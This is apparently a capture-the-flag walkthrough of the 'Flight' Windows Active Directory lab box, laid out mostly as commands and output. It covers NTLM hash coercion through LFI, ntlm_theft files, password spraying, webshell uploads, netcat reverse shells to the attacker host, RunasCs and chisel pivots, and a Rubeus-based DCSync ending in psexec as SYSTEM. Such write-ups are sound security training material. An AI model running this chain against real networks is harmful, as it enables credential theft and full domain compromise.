#Windows #ActiveDirectory #subdomainbrute #LFI #Responder #NTLMv2 #SMB #passwordspraying #ntlm_theft #webshell #RunAsCs #chisel #IIS #Rubeus #DCSync #PSExec #impacket

## Overview

Flight is a hard Windows Active Directory box that chains three distinct techniques before reaching the domain controller. An LFI on a PHP subdomain triggers NTLM authentication to Responder; the captured hash cracks to low-privileged creds; password spraying finds reuse; `ntlm_theft` files placed in a writable SMB share capture a second user's NTLMv2 hash; that user writes a PHP webshell to the web share. From there RunAsCs pivots to a higher-privileged user who can write to IIS `development`, leading to an ASPX webshell as `IIS AppPool`. Rubeus converts that service account ticket into a Kerberos-based DCSync against the domain controller, recovering the Administrator NTLM hash.

## Recon

Nmap revealed a domain controller profile: Kerberos, LDAP, DNS, SMB all present. The web server ran Apache with PHP. Adding `flight.htb` to `/etc/hosts` and running GoBuster against the main site found only static content.

### Subdomain Discovery

```sh
wfuzz -u http://10.129.228.120 -H "Host: FUZZ.flight.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069
# school  -> 200
```

`school.flight.htb` runs a PHP app with a `?view=` parameter that triggers outbound requests, a clear LFI/RFI pattern.

## Foothold

### LFI to NTLMv2 Capture (svc_apache)

Sending an SMB path in the `view` parameter caused the server to authenticate against Responder:

```sh
sudo responder -I tun0
# then browse to:
# http://school.flight.htb/index.php?view=//10.10.14.70/test
```

```sh
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:624951a5b5fafe7c:AC8870AE...
```

> **Why SMB paths trigger NTLM auth:** when PHP (or the OS) tries to open a UNC path (`\\host\share`), Windows transparently attempts SMB authentication. That authentication sends an NTLMv2 challenge-response hash that Responder captures. The hash can then be cracked offline.

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
‹redacted›     (svc_apache)
```

Credentials: `svc_apache:‹redacted›`

### Password Spraying → s.moon

With a user list from SMB enumeration, spraying `svc_apache`'s password found reuse:

```sh
nxc smb flight.htb -u users.txt -p '‹redacted›' --continue-on-success
[+] flight.htb\svc_apache:‹redacted›
[+] flight.htb\s.moon:‹redacted›
```

`s.moon` had **write access** to the `Shared` SMB share.

### NTLM Theft via Shared SMB Share → c.bum

Using `ntlm_theft.py` to generate credential-triggering files, then uploading the allowed ones to the `Shared` share while Responder was still running:

```sh
python3 ntlm_theft.py -g all -s 10.10.14.70 -f evil
sudo smbclient //flight.htb/shared -U s.moon '‹redacted›'
smb: \> mput *
```

Several file types were blocked, but `desktop.ini` and XML files uploaded. Responder caught a new NTLMv2 hash for `c.bum`:

```sh
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:32c90507829f0229:CB62C540...
```

```sh
john hash --wordlist=/usr/share/wordlists/rockyou.txt
‹redacted›     (c.bum)
```

Credentials: `c.bum:‹redacted›`

> **ntlm_theft in a browsed share:** when a Windows user opens a folder containing certain file types (`.scf`, `desktop.ini`, Office files with remote templates), the OS automatically fetches embedded resources. If those resources point to an attacker's SMB server, NTLM authentication fires silently.

### PHP Webshell via Web SMB Share → svc_apache

`c.bum` had **write access** to the `Web` SMB share, which backed `school.flight.htb`. Uploading a PHP webshell:

```sh
smbclient //flight.htb/web -U c.bum '‹redacted›'
smb: \school.flight.htb\> put webshell.php
```

PoC:
```sh
http://school.flight.htb/webshell.php?cmd=dir
# Volume in drive C has no label.
# Directory of C:\xampp\htdocs\school.flight.htb
```

Executed a base64-encoded PowerShell reverse shell, landing as `flight\svc_apache`.

## Privilege Escalation

### svc_apache → c.bum (RunAsCs)

`svc_apache` had limited permissions. RunAsCs allowed executing a new shell as `c.bum` with known credentials:

```powershell
iwr -uri http://10.10.14.70/RunasCs.exe -OutFile r.exe
.\r.exe c.bum ‹redacted› -r 10.10.14.70:443 cmd
```

```sh
rlwrap nc -lvnp 443
C:\Windows\system32> whoami
flight\c.bum
```

### c.bum → IIS AppPool via Internal Development Site

Chisel forwarded an internal HTTP service on port 8000:

```sh
# Kali
./chisel server -p 8000 --reverse
# Target
.\chisel.exe client 10.10.14.70:8000 R:8001:127.0.0.1:8000
```

Browsing `http://127.0.0.1:8001` showed an IIS site. `c.bum` is in the `Web Devs` group, granting write access to `C:\inetpub\development\`. Uploading an ASPX webshell and running `nc.exe` through it:

```sh
# in webshell arguments field:
/c \programdata\nc.exe -e cmd 10.10.14.70 139
```

```sh
rlwrap nc -lvnp 139
c:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

### IIS AppPool → Domain Admin (Rubeus + DCSync)

`IIS AppPool\DefaultAppPool` is a machine account context. Cracking its NTLMv2 hash is not practical (machine account passwords are random and long). Instead, Rubeus was used to obtain a delegated Kerberos ticket:

```sh
.\rubeus.exe tgtdeleg /nowrap
```

The ticket was converted to ccache format and loaded as the Kerberos environment variable:

```sh
echo '<base64 ticket>' | base64 -d > ticket.kirbi
python3 kirbi2ccache.py ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

Clock sync was required before running secretsdump:

```sh
sudo timedatectl set-ntp off
sudo rdate -n 10.129.228.120
sudo impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:‹redacted›:::
```

> **Why tgtdeleg works from IIS AppPool:** machine accounts (including IIS AppPool identities) can request Kerberos tickets for their own delegation. `tgtdeleg` obtains a usable TGT for the machine account. Because machine accounts are domain-joined and trusted, that ticket can be used to request a DCSync-capable session against the DC.

## Root

```sh
impacket-psexec administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:‹redacted›
C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
‹redacted›
```

## Takeaways

- **PHP `?view=` parameters that trigger outbound requests can coerce NTLM hashes.** Send a UNC path to Responder rather than a local file path.
- **Password reuse is common across service and user accounts.** Always spray cracked creds against the full user list before moving on.
- **`desktop.ini` in a browsed SMB share triggers NTLM auth silently.** Of all the `ntlm_theft` file types, folder-browsed formats like `desktop.ini` work with minimal user interaction.
- **IIS AppPool accounts can obtain Kerberos tickets.** Rubeus `tgtdeleg` turns a limited web-process context into domain-authenticated Kerberos material, enabling DCSync without needing a plaintext password.
